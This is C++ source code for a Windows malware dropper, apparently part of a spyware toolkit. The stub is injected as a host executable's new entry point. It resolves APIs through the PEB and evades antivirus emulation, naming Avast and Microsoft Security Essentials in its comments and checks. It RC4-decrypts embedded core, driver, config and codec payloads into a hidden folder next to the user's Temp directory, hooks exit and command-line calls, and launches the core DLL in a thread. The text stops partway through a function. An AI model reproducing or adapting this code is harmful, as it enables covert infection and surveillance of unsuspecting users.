#include <time.h>

#include <iostream>
#include <string>
using namespace std;

#include <boost/filesystem.hpp>
namespace bf = boost::filesystem;

#include "../libs/AsmJit/AsmJit.h"

#include "DropperCode.h"
#include "XRefNames.h"
#include "depack.h"
#include "rc4.h"

#ifdef WIN32

#if _DEBUG
#define MESSAGE(msg) do { pfn_OutputDebugString(msg); } while(0)
#define MESSAGE1(msg, x) do { \
	char* OEPstr = (char*) pfn_VirtualAlloc(NULL, 256, MEM_COMMIT, PAGE_READWRITE); \
	pfn_sprintf(OEPstr, STRING(msg), x); \
	pfn_OutputDebugString(OEPstr); \
	pfn_VirtualFree(OEPstr, 0, MEM_RELEASE); \
} while (0)
#else
#define MESSAGE(msg) do {} while(0)
#define MESSAGE1(msg, x) do {} while(0)
#endif

#define INT3 __asm { int 3 }
#define CHECK_CALL(pfn) do { if ( NULL == (pfn) ) goto OEP_CALL; } while(0)

unsigned char JMPcode[] = { 0xE9, };

/*
 	uncomment if verbose debug needed
*/

#ifdef _DEBUG
#pragma message("")
#pragma message("****************************")
#pragma message("***** NOT FOR RELEASE ******")
#pragma message("*** VERBOSE MODE ENABLED ***")
#pragma message("****************************")
#pragma message("")
#endif

XREFNAMES data_imports[] = {
	
	{ "KERNEL32.DLL", 
	{
		"OutputDebugStringA",	// 0 / ref offset = 0
			"CreateFileA",			// 1 / ref offset = 4
			"CreateDirectoryA",		// 2
			"CloseHandle",			// 3
			"WriteFile",			// 4
			"ReadFile",				// 5
			"SetFilePointer",		// 6
			"GetModuleFileNameW",	// 7
			"VirtualAlloc",			// 8
			"VirtualFree",			// 9
			"VirtualProtect",		// 10
			"WinExec",				// 11
			"FreeLibrary",			// 12
			"GetEnvironmentVariableA", // 13
			"SetCurrentDirectoryA",  // 14
			"SetFileAttributesA",	// 15
			"DebugActiveProcess",	// 16
			"GetCurrentProcessID",	// 17
			"CreateThread",			// 18
			"GetThreadContext",		// 19
			"SetThreadContext",		// 20
			"GetFileSize",			// 21
			"Sleep",				// 22
			"GetLastError",         // 23
			"ExitProcess",          // 24
			"LoadLibraryA",			// 25
			"GetProcAddress",		// 26
			"VirtualQuery",			// 27
			"VerifyVersionInfoA",	// 28
			"GetVersionExA",		// 29
			"IsWow64Process",		// 30
			"GetCurrentProcess",	// 31
			"GetModuleHandleA",		// 32
			"GetCommandLineA",		// 33
			"GetCommandLineW",		// 34
			"GetModuleFileNameA",	// 35
			NULL
	}
	}, // KERNEL32.DLL
	{ "NTDLL.DLL",
	{
			"RtlExitUserProcess",	// 36
			NULL
	}
	}, // NTDLL.DLL
	
	{ "MSVCRT.DLL",
	{
		"sprintf",				// 37
		"exit",					// 38
		"_exit",				// 39
		NULL
	} 
	}, // USER32.DLL
	
	{ "ADVAPI32.DLL",
	{
		"GetCurrentHwProfileA", // 40
	}
	}, // ADVAPI32.DLL

	{ NULL, { NULL } }
};

char * _needed_strings[] = {
	// index 0 is reserved for executable name
	// index 1 is reserved for installation dir
	"TMP",					// 2
	"TEMP",					// 3
	"KERNEL32.DLL",			// 4
	"NTDLL.DLL",			// 5
	"MSVCRT.DLL",			// 6
	"LoadLibraryA",			// 7
	"GetProcAddress",		// 8
	"%systemroot%\\System32\\rundll32.exe \"", // 9
	"\",ABCDEF8",				// 10
	"ABCDEF5",					// 11
	"\\",					// 12
	"USER32.DLL",			// 13
	"GetCommandLineA",		// 14
	"GetCommandLineW",		// 15
	"RtlExitUserProcess",	// 16
	"exit",					// 17
	"_exit",				// 18
	"ExitProcess",			// 19

#ifdef _DEBUG
	"Error creating directory", // 20
	"ExitProcess index %d", // 21
	"ExitProcess hooked",   // 22
	"Restoring OEP code",	// 23
	"exit hooked",			// 24
	"OEP restored!",		// 25
	"Calling OEP @ %08x",	// 26
	"Error creating file",  // 27
	"Calling HFF5 ...",		// 28
	"HFF5 called!",			// 29
	"In ExitProcess Hook",  // 30
	"Quitting vector NOW!", // 31
	"VerifyVersionInfo @ %08x", // 32
	"Sys MajorVersion %d",		// 33
	"Sys MinorVersion %d",		// 34
	"Restoring stage1 code",	// 35
	"Restoring stage2 code",	// 36
	"Error uncompressing",		// 37
#endif

	NULL
};

#pragma optimize( "", off ) // *** Disable all optimizations - we need code "as is"!
#pragma code_seg(".extcd")  // *** Lets put all functions in a separated code segment


int __stdcall NewEntryPoint()
{	
	DWORD dwCurrentAddr = 0;
	DWORD OEP = 0;
	
	// bypass AVAST emulation (SuspBehav-B static detection)
	for (int i = 0; i < 1000; i+=4)
		i -= 2;
	
	// Get current EIP in dwCurrentAddr
	__asm {
		call lbl_ref1
	lbl_ref1:
		pop dwCurrentAddr
	}

	// *** Find the ending marker of data section <E> 
	DWORD dwMagic = 0;
	while ( dwMagic != 0x003E453C )
		dwMagic = (DWORD)(*(DWORD *)(--dwCurrentAddr));
	
	// *** Total size of data section
	dwCurrentAddr -= sizeof(DWORD);
	DWORD dwDataSize = (DWORD)(*(DWORD*)(dwCurrentAddr));
	
	// *** Pointer to data section header
	DataSectionHeader *header = (DataSectionHeader*) (dwCurrentAddr - dwDataSize);
	
	DWORD * stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
	char * strings = (char *) (((char*)header) + header->strings.offset);
	char * dlls = (char *) (((char*)header) + header->dlls.offset);
	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
	
	//
	// *** Get address of needed calls through PEB
	//
	LOADLIBRARY    pfn_LoadLibrary	   = 0;
	GETPROCADDRESS pfn_GetProcAddress  = 0;
	
	PEB_LIST_ENTRY* head;
	DWORD **pPEB;
	DWORD *Ldr;
	
	__asm {
		mov eax, 30h
		mov eax,DWORD PTR fs:[eax]
		add eax, 08h	// get the 2nd entry (kernel32.dll)
		mov ss:[pPEB], eax
	}
	
	Ldr = *(pPEB + 1);
	// AVAST detect this!!
	head = ((PEB_LIST_ENTRY *) *(Ldr + 3));
	
	PEB_LIST_ENTRY* entry = head;
	do {		
		DWORD imageBase = entry->ImageBase;
		if (imageBase == NULL)
			goto NEXT_ENTRY;
		
		IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*) entry->ImageBase;
		IMAGE_NT_HEADERS32* ntHeaders = (IMAGE_NT_HEADERS32*) (entry->ImageBase + dosHeader->e_lfanew);
		
		// *** check if we have an export table
		if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == NULL)
			goto NEXT_ENTRY;
		
		// *** get EXPORT table
		IMAGE_EXPORT_DIRECTORY* exportDirectory = 
			(IMAGE_EXPORT_DIRECTORY*) (imageBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
		
		// *** check for valid module name
		char* moduleName = (char*)(imageBase + exportDirectory->Name);
		if (moduleName == NULL)
			goto NEXT_ENTRY;
		
		if ( ! _STRCMPI_(moduleName, STRING(STRIDX_KERNEL32_DLL)) ) 
		{
			if (exportDirectory->AddressOfFunctions == NULL) goto NEXT_ENTRY;
			if (exportDirectory->AddressOfNames == NULL) goto NEXT_ENTRY;
			if (exportDirectory->AddressOfNameOrdinals == NULL) goto NEXT_ENTRY;
			
			DWORD* Functions = (DWORD*) (imageBase + exportDirectory->AddressOfFunctions);
			DWORD* Names = (DWORD*) (imageBase + exportDirectory->AddressOfNames);			
			WORD* NameOrds = (WORD*) (imageBase + exportDirectory->AddressOfNameOrdinals);
			
			// *** get pointers to LoadLibraryA and GetProcAddress entry points
			for (WORD x = 0; x < exportDirectory->NumberOfFunctions; x++)
			{
				if (Functions[x] == 0)
					continue;
				
				for (WORD y = 0; y < exportDirectory->NumberOfNames; y++)
				{
					if (NameOrds[y] == x)
					{
						char *name = (char *) (imageBase + Names[y]);
						if (name == NULL)
							continue;
						
						if (!_STRCMPI_(STRING(STRIDX_LOADLIBRARYA), name)) {
							pfn_LoadLibrary = (LOADLIBRARY) (imageBase + Functions[x]);
						} else if (!_STRCMPI_(STRING(STRIDX_GETPROCADDRESS), name)) {
							pfn_GetProcAddress = (GETPROCADDRESS) (imageBase + Functions[x]);
						}
						break;
					}
				}
			}
		}
NEXT_ENTRY:
		entry = (PEB_LIST_ENTRY *) entry->InLoadNext;
	
	} while (entry != head);

	//
	// *** Fix call addresses
	//
	
	DWORD callIndex = 0;
	char * ptr = dlls;
	while (ptr < (dlls + header->dlls.size)) {
		// get number of calls
		DWORD nCalls = *((DWORD*)ptr);
		ptr += sizeof(DWORD);
		// get name of dll
		char * dllName = ptr;
		
		// load dll
		HMODULE hMod = pfn_LoadLibrary(dllName);
				
		ptr += _STRLEN_(dllName) + 1;
		for (DWORD i = 0; i < nCalls; i++) {		
			
			// store address of call
			dll_calls[callIndex] = (DWORD) pfn_GetProcAddress(hMod, ptr);
			
			callIndex++;
			ptr += _STRLEN_(ptr) + 1;
		}
	}
	
	//
	// *** map call addresses to function pointers
	//
	
#ifdef _DEBUG
	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
#endif	
	
	CREATEFILE pfn_CreateFile = (CREATEFILE) dll_calls[CALL_CREATEFILEA];
	CREATEDIRECTORY pfn_CreateDirectory = (CREATEDIRECTORY) dll_calls[CALL_CREATEDIRECTORYA];
	CLOSEHANDLE pfn_CloseHandle = (CLOSEHANDLE) dll_calls[CALL_CLOSEHANDLE];
	WRITEFILE pfn_WriteFile = (WRITEFILE) dll_calls[CALL_WRITEFILE];
	READFILE pfn_ReadFile = (READFILE) dll_calls[CALL_READFILE];
	SETFILEPOINTER pfn_SetFilePointer = (SETFILEPOINTER) dll_calls[CALL_SETFILEPOINTER];
	GETMODULEFILENAME pfn_GetModuleFileName = (GETMODULEFILENAME) dll_calls[CALL_GETMODULEFILENAMEW];
	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) dll_calls[CALL_VIRTUALALLOC];
	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) dll_calls[CALL_VIRTUALFREE];
	VIRTUALPROTECT pfn_VirtualProtect = (VIRTUALPROTECT) dll_calls[CALL_VIRTUALPROTECT];
	WINEXEC pfn_WinExec = (WINEXEC) dll_calls[CALL_WINEXEC];
	FREELIBRARY pfn_FreeLibrary = (FREELIBRARY) dll_calls[CALL_FREELIBRARY];
	GETENVIRONMENTVARIABLE pfn_GetEnvironmentVariable = (GETENVIRONMENTVARIABLE) dll_calls[CALL_GETENVIRONMENTVARIABLEA];
	SETCURRENTDIRECTORY pfn_SetCurrentDirectory = (SETCURRENTDIRECTORY) dll_calls[CALL_SETCURRENTDIRECTORYA];
	SETFILEATTRIBUTES pfn_SetFileAttributes = (SETFILEATTRIBUTES) dll_calls[CALL_SETFILEATTRIBUTESA];
	DEBUGACTIVEPROCESS pfn_DebugActiveProcess = (DEBUGACTIVEPROCESS) dll_calls[CALL_DEBUGACTIVEPROCESS];
	GETCURRENTPROCESSID pfn_GetCurrentProcessID = (GETCURRENTPROCESSID) dll_calls[CALL_GETCURRENTPROCESSID];
	CREATETHREAD pfn_CreateThread = (CREATETHREAD) dll_calls[CALL_CREATETHREAD];
	GETTHREADCONTEXT pfn_GetThreadContext = (GETTHREADCONTEXT) dll_calls[CALL_GETTHREADCONTEXT];
	SETTHREADCONTEXT pfn_SetThreadContext = (SETTHREADCONTEXT) dll_calls[CALL_SETTHREADCONTEXT];
	GETFILESIZE pfn_GetFileSize = (GETFILESIZE) dll_calls[CALL_GETFILESIZE];
	SLEEP pfn_Sleep = (SLEEP) dll_calls[CALL_SLEEP];
	GETLASTERROR pfn_GetLastError = (GETLASTERROR) dll_calls[CALL_GETLASTERROR];
	SPRINTF pfn_sprintf = (SPRINTF) dll_calls[CALL_SPRINTF];
	VIRTUALQUERY pfn_VirtualQuery = (VIRTUALQUERY) dll_calls[CALL_VIRTUALQUERY];
	VERIFYVERSIONINFO pfn_VerifyVersionInfo = (VERIFYVERSIONINFO) dll_calls[CALL_VERIFYVERSIONINFO];
	GETVERSIONEX pfn_GetVersionEx = (GETVERSIONEX) dll_calls[CALL_GETVERSIONEX];
	GETCURRENTHWPROFILE pfn_GetCurrentHwProfile = (GETCURRENTHWPROFILE) dll_calls[CALL_GETCURRENTHWPROFILE];
	ISWOW64PROCESS pfn_IsWow64Process = (ISWOW64PROCESS) dll_calls[CALL_ISWOW64PROCESS];
	GETCURRENTPROCESS pfn_GetCurrentProcess = (GETCURRENTPROCESS) dll_calls[CALL_GETCURRENTPROCESS];
	GETMODULEHANDLE pfn_GetModuleHandle = (GETMODULEHANDLE) dll_calls[CALL_GETMODULEHANDLE];
	GETMODULEFILENAME pfn_GetModuleFileNameA = (GETMODULEFILENAME) dll_calls[CALL_GETMODULEFILENAMEA];

	DWORD imageBase = 0;
	__asm {
		push eax
		push ebx
		mov eax, fs:[30h]
		mov ebx, [eax+8]
		mov imageBase, ebx
		pop ebx
		pop eax
	}		
	
	// loop IAT lookin for ExitProcess
	IMAGE_DOS_HEADER * dosHeader = (IMAGE_DOS_HEADER *) imageBase;
	IMAGE_NT_HEADERS * ntHeaders = (IMAGE_NT_HEADERS *) (((PBYTE)dosHeader) + dosHeader->e_lfanew);
	
	//
	// GOTO OEP_CALL FROM NOW ON ONLY!!!
	//
	
	//goto OEP_CALL;
	
	//
	// *** verify essential calls (optional calls should be verified before each use) ***
	//
	CHECK_CALL( pfn_VirtualAlloc );
	CHECK_CALL( pfn_VirtualFree );
	CHECK_CALL( pfn_GetEnvironmentVariable );
	CHECK_CALL( pfn_VirtualQuery );
	CHECK_CALL( pfn_VirtualProtect );
	CHECK_CALL( pfn_GetVersionEx );
	CHECK_CALL( pfn_GetModuleHandle );


	/* Check for Microsoft Security Essential emulation */

	char *fName = (char *)pfn_VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
	pfn_GetModuleFileNameA(NULL, fName, MAX_PATH);
	DWORD prgLen = _STRLEN_(fName);

	// x86
	char x86MspEng[26] = { 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', ' ', 'S', 'e', 'c', 'u', 'r' ,'i', 't', 'y', ' ', 'C', 'l', 'i', 'e', 'n', 't', 0x0 };
	for(DWORD i=0; i<prgLen; i++)
		if(!_STRCMP_(fName+i, x86MspEng))
			goto OEP_CALL;

	// x64
	char x64MspEng[12] = { ':', '\\', 'm', 'y', 'a', 'p', 'p', '.', 'e', 'x', 'e', 0x0 };
	if(!_STRCMP_(&fName[1], x64MspEng))
		goto OEP_CALL;


	pfn_VirtualFree(fName, 0, MEM_RELEASE);
	

	//
	// *** check for 64bit system
	//
#if 0
	if (pfn_IsWow64Process) {
		BOOL res;
		pfn_IsWow64Process(pfn_GetCurrentProcess(), &res);

		// if we are on a 64bit system, don't drop
		if (res)
			goto OEP_CALL;
	}
#endif
	
	//
	// *** check OS version
	//
#if 0
	OSVERSIONINFOA* osVersion = (OSVERSIONINFOA*) pfn_VirtualAlloc(NULL, sizeof(OSVERSIONINFOA), MEM_COMMIT, PAGE_READWRITE);
	if (NULL == osVersion) {
		pfn_VirtualFree(osVersion, 0, MEM_RELEASE);
		goto OEP_CALL;
	}
	
	_MEMSET_(osVersion, 0, sizeof(OSVERSIONINFOA));
	osVersion->dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
	
	BOOL bVersion = pfn_GetVersionEx(osVersion);
	if ( FALSE == bVersion) {
		pfn_VirtualFree(osVersion, 0, MEM_RELEASE);
		goto OEP_CALL;
	}
	
	MESSAGE1(STRIDX_SYSMAJORVER, osVersion->dwMajorVersion);
	MESSAGE1(STRIDX_SYSMINORVER, osVersion->dwMinorVersion);
	
	// Verify we are not running on Windows 7 or later
	//if (osVersion->dwMajorVersion >= 6 && osVersion->dwMinorVersion >= 2) {
	//  pfn_VirtualFree(osVersion, 0, MEM_RELEASE);
	//	goto OEP_CALL;
	}
	
	pfn_VirtualFree(osVersion, 0, MEM_RELEASE);
#endif
	
	// Get user temporary directory
	char * lpTmpEnvVar = STRING(STRIDX_TMP_ENVVAR);
	char * lpTmpDir = (char*) pfn_VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
	if ( NULL == lpTmpDir )
		goto OEP_CALL;
	
	_ZEROMEM_(lpTmpDir, MAX_PATH);
	DWORD dwRet = pfn_GetEnvironmentVariable(lpTmpEnvVar, lpTmpDir, MAX_PATH);
	if (dwRet == 0) {
		char * lpTempEnvVar = STRING(STRIDX_TEMP_ENVVAR);
		dwRet = pfn_GetEnvironmentVariable(lpTempEnvVar, lpTmpDir, MAX_PATH);
		if (dwRet == 0) {
			// we are unable to get the user TMP or TEMP directory,
			// so call the OEP ... we failed!
			pfn_VirtualFree(lpTmpDir, 0, MEM_RELEASE);
			goto OEP_CALL;
		}
	}
	
	// Go back one level (i.e. from Temp to its parent directory)
	
	if ( lpTmpDir[_STRLEN_(lpTmpDir)] == '\\' )
		lpTmpDir[_STRLEN_(lpTmpDir)] = '\0';
	
	char* dirsep = _STRRCHR_(lpTmpDir, '\\');
	if (dirsep != 0)
		*dirsep = '\0';	// cut the part after the last directory separator
	else
		goto OEP_CALL;
	
	_STRCAT_(lpTmpDir, STRING(STRIDX_DIRSEP));
	_STRCAT_(lpTmpDir, STRING(STRIDX_INSTALL_DIR)); // lpInstDir);
	_STRCAT_(lpTmpDir, STRING(STRIDX_DIRSEP));
	
	MESSAGE(lpTmpDir);
	
	BOOL bRet = pfn_CreateDirectory(lpTmpDir, NULL);
	if (bRet == FALSE) {
		
		MESSAGE(STRING(STRIDX_ERRORCREDIR));
		
		DWORD dwLastError = pfn_GetLastError();
		switch (dwLastError) {
			case ERROR_ALREADY_EXISTS:
				// go on, simply overwrite all files
				break;
			case ERROR_PATH_NOT_FOUND:
				// mmmh ... something wrong here, user temp dir should be present!
				
				pfn_VirtualFree(lpTmpDir, 0, MEM_RELEASE);
				goto OEP_CALL;
				break;
		}
	}
	
	// directory created or already present, so jump into it
	pfn_SetCurrentDirectory(lpTmpDir);
	
	// add core.dll to path, will be used to call HFF8 later
	_STRCAT_(lpTmpDir, (char *) (((char*)header) + header->files.names.core.offset));
	header->dllPath = lpTmpDir;
	MESSAGE(header->dllPath);
	
	//
	// write the files
	//
	DUMPFILE pfn_DumpFile = (DUMPFILE) (((char*)header) + header->functions.dumpFile.offset);
	
	RC4_SKIP pfn_rc4skip = (RC4_SKIP) (((char*)header) + header->functions.rc4.offset);
#define RC4_SKIP(buf, buf_len, key, key_len, header) pfn_rc4skip((unsigned char*)key, key_len, 0, (unsigned char*)buf, buf_len, header)
	
	// CORE
	if (header->files.core.offset != 0 && header->files.core.size != 0) {
		CHAR* fileName = (char *) (((char*)header) + header->files.names.core.offset);
		CHAR* fileData = (char *) (((char*)header) + header->files.core.offset);
		DWORD size = header->files.core.size;
		DWORD originalSize = header->files.core.original_size;
		RC4_SKIP(fileData, size, header->rc4key, RC4KEYLEN, header);
		BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, header);
		if (ret == FALSE)
			goto OEP_CALL;
	}
	
	// CORE (64 bit)
	if (header->files.core64.offset != 0 && header->files.core64.size != 0) {
		CHAR* fileName = (char *) (((char*)header) + header->files.names.core64.offset);
		CHAR* fileData = (char *) (((char*)header) + header->files.core64.offset);
		DWORD size = header->files.core64.size;
		DWORD originalSize = header->files.core64.original_size;
		RC4_SKIP(fileData, size, header->rc4key, RC4KEYLEN, header);
		BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, header);
		if (ret == FALSE)
			goto OEP_CALL;
	}
	
	// CONFIG
	if (header->files.config.offset != 0 && header->files.config.size != 0) {
		CHAR* fileName = (char *) (((char*)header) + header->files.names.config.offset);
		CHAR* fileData = (char *) (((char*)header) + header->files.config.offset);
		DWORD size = header->files.config.size;
		DWORD originalSize = header->files.config.original_size;
		RC4_SKIP(fileData, size, header->rc4key, RC4KEYLEN, header);
		BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, header);
		if (ret == FALSE)
			goto OEP_CALL;
	}
	
	// DRIVER
	if (header->files.driver.offset != 0 && header->files.driver.size != 0) {
		CHAR* fileName = (char *) (((char*)header) + header->files.names.driver.offset);
		CHAR* fileData = (char *) (((char*)header) + header->files.driver.offset);
		DWORD size = header->files.driver.size;
		DWORD originalSize = header->files.driver.original_size;
		RC4_SKIP(fileData, size, header->rc4key, RC4KEYLEN, header);
		BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, header);
		if (ret == FALSE)
			goto OEP_CALL;
	}
	
	// DRIVER (64 bit)
	if (header->files.driver64.offset != 0 && header->files.driver64.size != 0) {
		CHAR* fileName = (char *) (((char*)header) + header->files.names.driver64.offset);
		CHAR* fileData = (char *) (((char*)header) + header->files.driver64.offset);
		DWORD size = header->files.driver64.size;
		DWORD originalSize = header->files.driver64.original_size;
		RC4_SKIP(fileData, size, header->rc4key, RC4KEYLEN, header);
		BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, header);
		if (ret == FALSE)
			goto OEP_CALL;
	}
	
	// CODEC
	if (header->files.codec.offset != 0 && header->files.codec.size != 0) {
		CHAR* fileName = (char *) (((char*)header) + header->files.names.codec.offset);
		CHAR* fileData = (char *) (((char*)header) + header->files.codec.offset);
		DWORD size = header->files.codec.size;
		DWORD originalSize = header->files.codec.original_size;
		RC4_SKIP(fileData, size, header->rc4key, RC4KEYLEN, header);
		BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, header);
		if (ret == FALSE)
			goto OEP_CALL;
	}

	if (header->files.bitmap.offset != 0 && header->files.bitmap.size != 0) {
		CHAR* fileName = (char *) (((char*)header) + header->files.names.bitmap.offset);
		CHAR* fileData = (char *) (((char*)header) + header->files.bitmap.offset);
		DWORD size = header->files.bitmap.size;
		DWORD originalSize = header->files.bitmap.original_size;
		RC4_SKIP(fileData, size, header->rc4key, RC4KEYLEN, header);
		BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, header);
		if (ret == FALSE)
			goto OEP_CALL;
	}
		
	//
	// Install exit hooks
	//
	HOOKCALL pfn_HookCall = (HOOKCALL) (((char*)header) + header->functions.hookCall.offset);
	EXITPROCESS pfn_ExitProcessHook = (EXITPROCESS)( ((char*)header) + header->functions.exitProcessHook.offset);
	
	IMAGE_DOS_HEADER * k32_dosHeader = (IMAGE_DOS_HEADER *) pfn_GetModuleHandle(STRING(STRIDX_KERNEL32_DLL));
	IMAGE_NT_HEADERS * k32_ntHeaders = (IMAGE_NT_HEADERS *) (((PBYTE)k32_dosHeader) + k32_dosHeader->e_lfanew);
	UINT_PTR k32_IAT = k32_ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
	ULONG oldProtect = 0xffffffff;

	if(pfn_HookCall && k32_IAT)
	{
		if(pfn_ExitProcessHook)
		{
			pfn_HookCall(STRING(STRIDX_NTDLL_DLL), 
				STRING(STRIDX_RTLEXITUSERPROCESS),
				(DWORD)pfn_ExitProcessHook,
				k32_IAT,
				(DWORD)k32_dosHeader,
				header);
			
			pfn_VirtualProtect(pfn_ExitProcessHook, 
				(ULONG)ExitProcessHook_End - (ULONG)ExitProcessHook,
				PAGE_EXECUTE_READWRITE,
				&oldProtect);
		}
	}

	UINT_PTR IAT_rva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
	if(pfn_HookCall && IAT_rva)
	{
		pfn_HookCall(STRING(STRIDX_MSVCRT_DLL),
			STRING(STRIDX_EXITCALL),
			(DWORD)pfn_ExitProcessHook,
			IAT_rva,
			imageBase,
			header);
		
		pfn_HookCall(STRING(STRIDX_MSVCRT_DLL),
			STRING(STRIDX__EXITCALL),
			(DWORD)pfn_ExitProcessHook,
			IAT_rva,
			imageBase,
			header);
		
		pfn_HookCall(STRING(STRIDX_KERNEL32_DLL),
			STRING(STRING_EXITPROCESS),
			(DWORD)pfn_ExitProcessHook,
			IAT_rva,
			imageBase,
			header);
	}

	if(header->exeType == EXE_TYPE_NSIS_INSTALLER)
	{
		GETCOMMANDLINEA pfn_GetCommandLineA = (GETCOMMANDLINEA) ( ((char*)header) + header->functions.GetCommandLineAHook.offset);
		if(pfn_GetCommandLineA)
		{
			pfn_HookCall(STRING(STRIDX_KERNEL32_DLL), STRING(STRIDX_GETCMDLINEA), (DWORD)pfn_GetCommandLineA, IAT_rva, imageBase, header);	
			pfn_VirtualProtect(pfn_GetCommandLineA, (ULONG)GetCommandLineAHook_End - (ULONG)GetCommandLineAHook, PAGE_EXECUTE_READWRITE, &oldProtect);
		}

		GETCOMMANDLINEW pfn_GetCommandLineW = (GETCOMMANDLINEW) ( ((char*)header) + header->functions.GetCommandLineWHook.offset);
		if(pfn_GetCommandLineW)
		{
			pfn_HookCall(STRING(STRIDX_KERNEL32_DLL), STRING(STRIDX_GETCMDLINEW), (DWORD)pfn_GetCommandLineW, IAT_rva, imageBase, header);
			pfn_VirtualProtect(pfn_GetCommandLineW, 
				(ULONG)GetCommandLineWHook_End - (ULONG)GetCommandLineWHook, 
				PAGE_EXECUTE_READWRITE, 
				&oldProtect);
		}
	}
	//
	// Spawn thread to run core dll
	//
	THREADPROC pfn_CoreThreadProc = (THREADPROC)(((char*)header) + header->functions.coreThread.offset); 

	if (pfn_CoreThreadProc) {
		// handle apps that enforce NX at runtime(e.g firefox, acrobat reader)
		pfn_VirtualProtect(pfn_CoreThreadProc, 
			(UINT_PTR)CoreThreadProc_End - (UINT_PTR)CoreThreadProc, 
			PAGE_EXECUTE_READWRITE, 
			&oldProtect);
		pfn_CreateThread(NULL, 0, pfn_CoreThreadProc, header, 0, NULL);
	} else {
		// XXX installation of core failed, we should remove any traces of intallation
		goto OEP_CALL;
	}


OEP_CALL:
	
	//
	// *** Restore OEP code
	//
	
	MESSAGE(STRING(STRIDX_RESTORESTAGE1));
	
	if (header->stage1.size) {
		DWORD oldProtect = 0;
		char *code = (char*) ( ((char*)header) + header->stage1.offset );
		size_t size = header->stage1.size;

		pfn_VirtualProtect( (LPVOID) header->stage1.VA, size, PAGE_EXECUTE_READWRITE, &oldProtect );
		_MEMCPY_( (char*) header->stage1.VA, code, size );
		pfn_VirtualProtect( (LPVOID) header->stage1.VA, size, oldProtect, &oldProtect );
	}
	
	MESSAGE(STRING(STRIDX_RESTORESTAGE2));
	
	if (header->stage2.size) {
		DWORD oldProtect = 0;
		char *code = (char*) ( ((char*)header) + header->stage2.offset );
		size_t size = header->stage2.size;
		
		pfn_VirtualProtect( (LPVOID) header->stage2.VA, size, PAGE_EXECUTE_READWRITE, &oldProtect );
		_MEMCPY_( (char*) header->stage2.VA, code, size );
		pfn_VirtualProtect( (LPVOID) header->stage2.VA, size, oldProtect, &oldProtect );
	}
	
	return 0;
}
FUNCTION_END(NewEntryPoint);


BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD dataSize, DWORD originalSize, DataSectionHeader *header)
{
	DWORD * stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
	char * strings = (char *) (((char*)header) + header->strings.offset);
	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
	
	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) dll_calls[CALL_VIRTUALALLOC];
	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) dll_calls[CALL_VIRTUALFREE];
	SETFILEATTRIBUTES pfn_SetFileAttributes = (SETFILEATTRIBUTES) dll_calls[CALL_SETFILEATTRIBUTESA];
	CREATEFILE pfn_CreateFile = (CREATEFILE) dll_calls[CALL_CREATEFILEA];
	WRITEFILE pfn_WriteFile = (WRITEFILE) dll_calls[CALL_WRITEFILE];
	CLOSEHANDLE pfn_CloseHandle = (CLOSEHANDLE) dll_calls[CALL_CLOSEHANDLE];
	
#if defined PACK_DATA
	// decompress data
	char* uncompressed = (char*) pfn_VirtualAlloc(NULL, originalSize, MEM_COMMIT, PAGE_READWRITE);
	
	int uncompressed_size = aP_depack(fileData, uncompressed);
	if (uncompressed_size != originalSize) {
		MESSAGE(STRING(STRIDX_UNCOMPRESS_ERR));
		return FALSE;
	}
#else
	char* uncompressed = fileData;
#endif
	
	// create or open the file for overwriting
	MESSAGE(fileName);
		
	// restore normal attributes if the file already exists
	pfn_SetFileAttributes(fileName, FILE_ATTRIBUTE_NORMAL);
	
	HANDLE hFile = pfn_CreateFile(fileName, 
		GENERIC_READ | GENERIC_WRITE, 
		0, 
		NULL, 
		CREATE_ALWAYS, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		MESSAGE(STRING(STRIDX_CREATEFILE_ERR));
		return FALSE;
	}
	
	// write data to file
	DWORD cbWritten = 0;
	BOOL bRet = pfn_WriteFile(hFile, uncompressed, originalSize, &cbWritten, NULL);
	if (bRet == FALSE)
		return FALSE;
	
	// close it
	pfn_CloseHandle(hFile);
	
#if defined PACK_DATA
	pfn_VirtualFree(uncompressed, 0, MEM_RELEASE);
#endif

	return TRUE;
}
FUNCTION_END(DumpFile);


DWORD WINAPI CoreThreadProc(__in  LPVOID lpParameter)
{	
	DataSectionHeader* header = (DataSectionHeader*) lpParameter;
	
	DWORD* stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
	char * strings = (char *) (((char*)header) + header->strings.offset);
	char * dlls = (char *) (((char*)header) + header->dlls.offset);
	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
	
